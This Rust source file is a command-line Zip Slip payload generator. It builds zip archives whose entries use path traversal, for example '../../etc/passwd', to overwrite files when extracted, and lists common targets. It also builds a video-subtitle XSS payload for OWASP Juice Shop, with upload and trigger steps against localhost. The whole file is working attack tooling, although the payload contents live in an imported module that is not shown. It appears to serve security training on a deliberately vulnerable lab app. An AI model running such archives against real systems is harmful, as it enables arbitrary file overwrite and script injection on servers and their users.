//! Zip Slip payload generator CLI
//!
//! Usage:
//!   zip-payload create -o exploit.zip -t "../../etc/passwd" -c "content"
//!   zip-payload juice-shop -o exploit.zip
//!   zip-payload list

use clap::{Parser, Subcommand};
use web_security_toolkit::zip_payload::*;

#[derive(Parser)]
#[command(name = "zip-payload")]
#[command(about = "Zip Slip payload generator for path traversal attacks")]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Create a custom Zip Slip payload
    Create {
        /// Output zip file path
        #[arg(short, long, default_value = "exploit.zip")]
        output: String,
        /// Target path (with path traversal)
        #[arg(short, long)]
        target: String,
        /// Content to write
        #[arg(short, long)]
        content: String,
    },
    /// Create Juice Shop Video XSS payload
    JuiceShop {
        /// Output zip file path
        #[arg(short, long, default_value = "exploit.zip")]
        output: String,
    },
    /// List common Zip Slip targets
    List,
}

fn main() {
    let cli = Cli::parse();

    match cli.command {
        Commands::Create { output, target, content } => {
            println!("[*] Creating Zip Slip payload...");
            println!("    Output: {}", output);
            println!("    Target: {}", target);
            
            match create_zip_slip(&output, &target, content.as_bytes()) {
                Ok(_) => {
                    let size = std::fs::metadata(&output)
                        .map(|m| m.len())
                        .unwrap_or(0);
                    println!("[+] Created: {} ({} bytes)", output, size);
                }
                Err(e) => {
                    eprintln!("[-] Error: {}", e);
                    std::process::exit(1);
                }
            }
        }
        Commands::JuiceShop { output } => {
            println!("[*] Creating Juice Shop Video XSS payload...");
            
            let target = juice_shop_vtt_xss();
            println!("    Target: {}", target.path);
            
            match create_zip_slip(&output, &target.path, &target.content) {
                Ok(_) => {
                    let size = std::fs::metadata(&output)
                        .map(|m| m.len())
                        .unwrap_or(0);
                    println!("[+] Created: {} ({} bytes)", output, size);
                    println!();
                    println!("Next steps:");
                    println!("1. Upload to http://localhost:3000/#/complain");
                    println!("2. Check: curl http://localhost:3000/assets/public/videos/owasp_promo.vtt");
                    println!("3. Trigger: http://localhost:3000/promotion");
                }
                Err(e) => {
                    eprintln!("[-] Error: {}", e);
                    std::process::exit(1);
                }
            }
        }
        Commands::List => {
            println!("=== Common Zip Slip Targets ===\n");
            for target in common_targets() {
                println!("{}", target.name);
                println!("  Path: {}", target.path);
                println!("  Content: {} bytes", target.content.len());
                println!();
            }
            
            println!("=== Juice Shop Target ===\n");
            let js = juice_shop_vtt_xss();
            println!("{}", js.name);
            println!("  Path: {}", js.path);
        }
    }
}
